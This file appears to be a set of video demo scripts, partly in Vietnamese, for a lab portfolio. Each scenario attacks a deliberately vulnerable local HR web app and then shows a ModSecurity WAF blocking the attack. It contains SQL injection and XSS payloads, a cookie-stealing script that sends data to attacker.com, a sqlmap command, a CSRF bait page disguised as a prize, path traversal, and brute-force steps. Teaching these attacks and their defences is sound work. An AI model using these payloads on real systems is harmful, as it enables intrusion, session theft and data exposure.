# 🎬 DEMO SCENARIOS
# Video Demo Scripts for Portfolio

---

## DEMO 1: SQL Injection Attack & Defense

### Scene 1: Show the vulnerable app
```bash
# Open browser: http://localhost:8000/login (NexusHR Enterprise System)
# Normal login: Corporate Employee ID = john, Secure Password = JohnPass123
# Show: Login works normally, redirects to Corporate Payroll Dashboard
```

### Scene 2: SQL Injection Attack
```bash
# In Corporate Employee ID field, type:
# admin' OR '1'='1' --

# In Secure Password field, type: anything

# Show: Login bypass! Logged in as Admin (Management Level) without password
```

### Scene 3: SQLMap automated attack
```bash
sqlmap -u "http://localhost:8000/login" \
    --data="username=admin&password=test" \
    --method=POST \
    --dbs
# Show: SQLMap extracts database list
```

### Scene 4: WAF Protection
```bash
# Start WAF: cd C:\Users\ACER\Downloads\files\web-app-security-law86\3_waf-deployment && docker-compose up -d

# Now retry SQL injection through WAF (port 80):
curl -X POST http://localhost:80/login \
    -d "username=admin'+OR+'1'%3D'1'--&password=x"

# Show: HTTP 403 - BLOCKED by WAF!
```

---

## DEMO 2: XSS Attack & Defense

### Scene 1: Create malicious post
```bash
# Go to: http://localhost:8000/posts (Corporate Announcements)
# Use the "Employee Feedback" comment box at the top of the feed.
# In the textarea, enter:
# <script>alert('Your browser has been hacked!')</script>
# Click "Post Feedback"
```

### Scene 2: View the post (XSS fires)
```bash
# The feed reloads.
# Browser shows alert popup immediately.
# Show: Any employee viewing this Corporate Feed gets the XSS silently executed.
```

### Scene 3: Cookie stealer XSS
```javascript
// More dangerous payload:
<script>
fetch('http://attacker.com/steal?cookie=' + document.cookie)
</script>
// Show server logs showing stolen cookies
```

### Scene 4: WAF blocks XSS
```bash
curl -X POST http://localhost:80/posts \
    -d "content=<script>alert('XSS')</script>"
# Show: 403 Blocked!
```

---

## DEMO 3: IDOR - Accessing Other Users' Data

### Scene 1: Normal access
```bash
# Logged in as user john (ID: 2)
# Click "My Payslip": http://localhost:8000/profile/2
# Show: John's Payslip is visible, showing his salary and deductions.
```

### Scene 2: IDOR Attack & Privilege Escalation
```bash
# Change URL to: http://localhost:8000/profile/1
# Show: Admin's completely confidential Payslip with sensitive SSN and salary!

# Try: http://localhost:8000/profile/3
# Show: Another employee's Payslip is fully exposed!

# Privilege Escalation:
# In the "Update Contact Information" form, use browser inspect element to change the 
# "System Access Level" (role) to "Administrator" and submit the form.
```

### Scene 3: WAF chặn IDOR (Mass Assignment)
```bash
# Đăng nhập john trên cổng 80: http://localhost/login (john / john123)
# Vào profile: http://localhost/profile/2
# Đổi System Access Level từ "Standard User" sang "Administrator"
# Bấm Save Changes

# Kết quả: Trang 🛑 403 FORBIDDEN!
# WAF Rule 9003 phát hiện tham số "role=" trong body → Chặn!
```

---

## DEMO 4: CSRF Attack & WAF Defense

### Scene 1: Chuẩn bị file mồi CSRF
```bash
# File bay_chuot_csrf.html trong folder public/ chứa form ẩn tự động POST
# Giả dạng trang "Bạn đã trúng thưởng iPhone 16 Pro Max!"
# Form tàng hình gửi bài viết chửi sếp dưới tên nạn nhân
```

### Scene 2: CSRF Attack thành công (Cổng 8000 - Không có WAF)
```bash
# Bước 1: Sửa file bay_chuot_csrf.html → action="http://localhost:8000/posts"
# Bước 2: Copy file vào Docker:
docker cp C:\Users\ACER\Downloads\files\web-app-security-law86\1_vulnerable-webapp\public\bay_chuot_csrf.html vulnerable-webapp:/var/www/html/public/bay_chuot_csrf.html

# Bước 3: Đăng nhập john trên http://localhost:8000/login (john / john123)
# Bước 4: Mở tab mới → gõ http://localhost:8000/bay_chuot_csrf.html
# Bước 5: Trang hiện "Đang tải phần thưởng..." → Form tự động submit
# Bước 6: Kiểm tra http://localhost:8000/posts

# Kết quả: Bài viết "Sếp là một tên ngốc!" xuất hiện dưới tên John!
# John không hề biết mình vừa đăng bài này!
```

### Scene 3: WAF chặn CSRF (Cổng 80 - Có WAF)
```bash
# Bước 1: Sửa file bay_chuot_csrf.html → action="http://localhost/posts"
# Bước 2: Copy file vào Docker:
docker cp C:\Users\ACER\Downloads\files\web-app-security-law86\1_vulnerable-webapp\public\bay_chuot_csrf.html vulnerable-webapp:/var/www/html/public/bay_chuot_csrf.html

# Bước 3: Đăng nhập john trên http://localhost/login (john / john123)
# Bước 4: Mở tab mới → gõ http://localhost:8000/bay_chuot_csrf.html
#          (File mồi phục vụ từ cổng 8000 nhưng gửi tới cổng 80)

# Kết quả: Trang 🛑 403 FORBIDDEN!
# WAF Rule 9004 kiểm tra:
#   - Request là POST ✓
#   - Referer = "http://localhost:8000/..." ≠ "http://localhost/" ✓
#   → CẢ 2 điều kiện chain thỏa mãn → CHẶN!
# Bài viết KHÔNG được đăng. CSRF bị vô hiệu hóa.
```

### ⚠️ Lưu ý khi demo CSRF
```bash
# ❌ KHÔNG mở bay_chuot_csrf.html bằng click đúp File Explorer
#    → Chrome SameSite Cookie chặn, không gửi session cookie → Văng ra login

# ✅ PHẢI mở qua URL: http://localhost:8000/bay_chuot_csrf.html
#    → Cookie localhost được gửi kèm → Attack hoạt động
```

---

## DEMO 5: Sensitive File Exposure & WAF Defense

### Scene 1: Lộ file .env (Cổng 8000 - Không có WAF)
```bash
# Mở trình duyệt, gõ thẳng: http://localhost:8000/.env
# Kết quả: Hiển thị toàn bộ file .env chứa:
#   APP_KEY=base64:xxxxxxxxxxxx
#   DB_HOST=app-db
#   DB_DATABASE=vulnerable_db
#   DB_USERNAME=appuser
#   DB_PASSWORD=apppass123
# → Hacker có được mật khẩu Database, API Key, cấu hình server!

# Lưu ý: File .env đã được copy vào public/ để demo:
docker exec vulnerable-webapp cp /var/www/html/.env /var/www/html/public/.env
```

### Scene 2: WAF chặn truy cập .env (Cổng 80)
```bash
# Mở trình duyệt, gõ: http://localhost/.env
# Kết quả: Trang 🛑 403 FORBIDDEN!
# Bị chặn bởi 2 tầng:
#   Tầng 1: Nginx location ~* (.env) → deny all
#   Tầng 2: WAF Rule 8001 (REQUEST_URI chứa .env)
```

### Scene 3: Các file nhạy cảm khác
```bash
# Test thêm:
# http://localhost/.git     → 403 FORBIDDEN
# http://localhost/backup.bak → 403 FORBIDDEN
```

---

## DEMO 6: Path Traversal & WAF Defense

### Scene 1: Path Traversal Attack (Cổng 8000)
```bash
# Vào trang đăng nhập: http://localhost:8000/login
# Ở ô Username, nhập payload:
#   ../../../../etc/passwd
# Password: bất kỳ
# Bấm Sign In

# Kết quả: Đăng nhập thất bại (vì không có user tên như vậy)
# Trong thực tế, nếu ứng dụng dùng input này để đọc file
# → Hacker đọc được /etc/passwd (danh sách user hệ thống)
```

### Scene 2: WAF chặn Path Traversal (Cổng 80)
```bash
# Vào: http://localhost/login
# Ở ô Username, nhập ĐÚNG Y CHANG payload:
#   ../../../../etc/passwd
# Bấm Sign In

# Kết quả: Trang 🛑 403 FORBIDDEN!
# WAF Rule 3001 phát hiện chuỗi "../" trong tham số form → Chặn!
```

---

## DEMO 7: Rate Limiting (Chống Brute Force)

### Scene 1: Brute Force trên cổng 80
```bash
# Vào http://localhost/login
# Đăng nhập sai liên tục 6 lần (username/password bất kỳ)
# Lần thứ 6 trở đi: Trang 503 Service Temporarily Unavailable

# Nginx Rate Limiting: location /login → rate=5r/m (5 lần/phút)
# Lần thứ 6 vượt quá giới hạn → Nginx tự chặn → 503
```

---

## DEMO 8: SonarQube Analysis

### Scene 1: Run scan

**Cách 1: Quét tự động bằng Docker (Dùng script có sẵn)**
```bash
cd 6_automation
bash run-sonarqube-scan.sh
# Show: Scanner running via Docker, analyzing files
```

**Cách 2: Quét thủ công trên Windows (Dùng SonarScanner CLI)**
```powershell
# 1. Khởi tạo Project trên http://localhost:9000 và lấy Token
# 2. Mở PowerShell tại thư mục source code
cd C:\Users\ACER\Downloads\files\web-app-security-law86\1_vulnerable-webapp

# 3. Chạy lệnh sonar-scanner (đường dẫn tuyệt đối) với Token vừa tạo
C:\Users\ACER\Downloads\sonar-scanner-cli-5.0.1.3006-windows\sonar-scanner-5.0.1.3006-windows\bin\sonar-scanner.bat -D"sonar.projectKey=Vulnerable-Web-App-2" -D"sonar.sources=." -D"sonar.host.url=http://localhost:9000" -D"sonar.token=sqp_YOUR_TOKEN_HERE"
```

### Scene 2: View results in dashboard
```bash
# Open: http://localhost:9000
# Show: Project dashboard with issues (Quality Gate Passed/Failed)
# Click on CRITICAL / HIGH issues
# Show: SQL injection, Hardcoded Credentials, XSS highlighted in code
```

---

## DEMO 9: Compliance Mapping

### Scene 1: Show the compliance matrix
```bash
cat 4_compliance/COMPLIANCE_MATRIX.md
# Show: Requirements met
```

### Scene 2: Explain a specific control
```bash
# Điều 23 - Data Protection:
# IDOR fix ensures users can't access other's PII
# Encryption protects stored data
# Audit logs track all access
```

---

## DEMO 10: OWASP ZAP — Quét lỗ hổng tự động

> **OWASP ZAP (Zed Attack Proxy)** là công cụ quét bảo mật web tự động, phát hiện lỗ hổng mà không cần viết payload thủ công.

### Scene 1: Khởi động ZAP và cấu hình Proxy
```
1. Mở OWASP ZAP
2. Vào Tools → Options → Network → Local Proxy
   - Address: 127.0.0.1
   - Port: 8080
3. Cấu hình Chrome dùng proxy 127.0.0.1:8080
   (hoặc dùng ZAP browser tích hợp sẵn)
4. Truy cập http://localhost:8000 qua proxy
   → ZAP sẽ capture toàn bộ traffic vào Sites tree
```

### Scene 2: Spider / Active Scan (Tự động khám phá)
```
1. Trong ZAP, click phải vào http://localhost:8000 trong Sites tree
2. Chọn "Attack" → "Spider" → Bấm Start Scan
   → ZAP tự động crawl toàn bộ đường dẫn, form, link
   → Tìm: /login, /posts, /profile/1, /posts/create...

3. Sau khi Spider xong, chọn "Active Scan"
   → ZAP tự động inject payload SQLi, XSS, Path Traversal...
   → Chờ quét xong (khoảng 5-10 phút)
```

### Scene 3: Xem kết quả Alerts
```
1. Mở tab "Alerts" ở góc dưới ZAP
2. Kết quả sẽ gồm:
   🔴 High: SQL Injection tại /login
   🔴 High: XSS tại /posts
   🟠 Medium: CSRF tại POST /posts
   🟡 Low: Missing security headers (X-Frame-Options, CSP...)

3. Click từng Alert để xem:
   - URL bị ảnh hưởng
   - Evidence (bằng chứng)
   - Solution (cách fix)
```

### Scene 4: Xuất báo cáo ZAP
```
1. Menu: Report → Generate Report
2. Chọn format HTML hoặc PDF
3. Lưu file → Đưa vào thư mục 5_penetration-testing/EVIDENCE/
```

### ⚠️ Lưu ý quan trọng khi demo ZAP
```
# Chỉ scan trên cổng 8000 (không có WAF):
# http://localhost:8000
# → ZAP sẽ phát hiện đầy đủ lỗ hổng

# Nếu scan qua cổng 80 (có WAF):
# → ZAP vẫn thấy lỗ hổng trong code nhưng sẽ báo nhiều 403
# → Điều này CHỨNG MINH WAF đang hoạt động!
```

---

## DEMO 11: Burp Suite — Kiểm tra thủ công chuyên sâu

> **Burp Suite Community** là công cụ intercept proxy cho phép chỉnh sửa request/response HTTP theo thời gian thực — lý tưởng cho kiểm tra IDOR, CSRF, Mass Assignment.

### Scene 1: Cấu hình Burp Suite Proxy
```
1. Mở Burp Suite → Tab "Proxy" → "Options"
   - Proxy Listener: 127.0.0.1:8080 (mặc định)
2. Mở Chrome → Settings → System → Open proxy settings
   - HTTP Proxy: 127.0.0.1, Port: 8080
3. Cài Certificate của Burp vào Chrome:
   - Truy cập http://burpsuite → Download CA Certificate
   - Chrome Settings → Privacy → Certificates → Import
4. Intercept: ON
```

### Scene 2: Test SQL Injection bằng Burp Repeater
```
1. Vào http://localhost:8000/login trên Chrome
2. Nhập username: admin, password: test → Bấm Login
3. Burp bắt request → Click "Send to Repeater" (Ctrl+R)
4. Trong Repeater, sửa body:
   username=admin' OR '1'='1' #&password=test
5. Bấm "Send"
6. Response: HTTP 302 redirect → Đã bypass login!

# Chụp ảnh Request và Response để làm bằng chứng
```

### Scene 3: Test IDOR bằng Burp (Đổi ID)
```
1. Đăng nhập john (john / john123)
2. Truy cập http://localhost:8000/profile/2 (profile của john)
3. Burp bắt GET request → Send to Repeater
4. Sửa URL: /profile/2 → /profile/1
5. Bấm Send
6. Response: HTTP 200 + toàn bộ dữ liệu Admin!
   (Lương, SSN, email, role...)

# So sánh 2 tab: profile/2 (john) vs profile/1 (admin)
# → Chứng minh rõ ràng lỗi IDOR
```

### Scene 4: Test CSRF bằng Burp (Chỉnh Referer)
```
1. Đăng nhập john trên http://localhost/login (cổng 80 - có WAF)
2. Truy cập http://localhost:8000/bay_chuot_csrf.html
3. Burp bắt POST request tới http://localhost/posts
4. Xem headers: Referer = http://localhost:8000/...
5. WAF Rule 9004: Referer không khớp localhost/ → 403!

# Thử xóa header Referer trong Burp → Vẫn bị chặn (chain rule)
# Thử đổi Referer = http://localhost/ → Request đi qua được!
# → Hiểu rõ cơ chế WAF rule
```

### Scene 5: Test Mass Assignment bằng Burp Repeater
```
1. Đăng nhập john, vào http://localhost:8000/profile/2
2. Đổi email, bấm Save Changes
3. Burp bắt POST /profile/2/update
4. Send to Repeater
5. Trong body, thêm: &role=admin
6. Bấm Send
7. Response: 302 redirect → Profile updated!
8. F5 lại trang → Role đã đổi thành Administrator!

# Đây là Mass Assignment: server nhận bất kỳ field nào từ client
# mà không validate
```

### Scene 6: Burp Intruder — Tự động Brute Force (Demo)
```
1. Bắt POST /login request
2. Send to Intruder (Ctrl+I)
3. Tab "Positions": Highlight giá trị password → Add §
   username=admin&password=§test§
4. Tab "Payloads": Load file password wordlist
5. Bấm "Start Attack"
6. Quan sát: Response length khác biệt → Tìm đúng password

# Lưu ý: Community Edition sẽ bị giới hạn tốc độ (chậm hơn Pro)
```

---

## 📊 BẢNG TÓM TẮT TEST

| # | Lỗ hổng | Cổng 8000 (Hack) | Cổng 80 (WAF) | Rule chặn |
|---|---------|-------------------|----------------|-----------|
| 1 | SQL Injection | `/login` → `admin' OR '1'='1' #` | 🛑 403 | Rule 1001 |
| 2 | XSS | `/posts/create` → `<img onerror=alert(1)>` | 🛑 403 | Rule 2001,2003 |
| 3 | IDOR | `/profile/2` → đổi Role admin | 🛑 403 | Rule 9003 |
| 4 | CSRF | `bay_chuot_csrf.html` → POST auto | 🛑 403 | Rule 9004 |
| 5 | Sensitive File | `/.env` → Lộ DB password | 🛑 403 | Rule 8001 |
| 6 | Path Traversal | `/login` → `../../../../etc/passwd` | 🛑 403 | Rule 3001 |
| 7 | Brute Force | (N/A) | ⏱️ 503 | Rate Limit |

---

## 🔧 LỆNH DOCKER CẦN THIẾT

```powershell
# Copy .env vào public/ (demo Sensitive File)
docker exec vulnerable-webapp cp /var/www/html/.env /var/www/html/public/.env

# Copy CSRF bait file vào Docker
docker cp C:\Users\ACER\Downloads\files\web-app-security-law86\1_vulnerable-webapp\public\bay_chuot_csrf.html vulnerable-webapp:/var/www/html/public/bay_chuot_csrf.html

# Copy cấu hình WAF mới
docker cp C:\Users\ACER\Downloads\files\web-app-security-law86\3_waf-deployment\nginx-config\nginx.conf waf-modsecurity:/etc/nginx/nginx.conf
docker cp C:\Users\ACER\Downloads\files\web-app-security-law86\3_waf-deployment\nginx-config\modsecurity.conf waf-modsecurity:/etc/modsecurity.d/modsecurity.conf

# Restart WAF
docker restart waf-modsecurity

# Xem log WAF
docker logs waf-modsecurity --tail 20
docker logs waf-modsecurity --since 30s
```

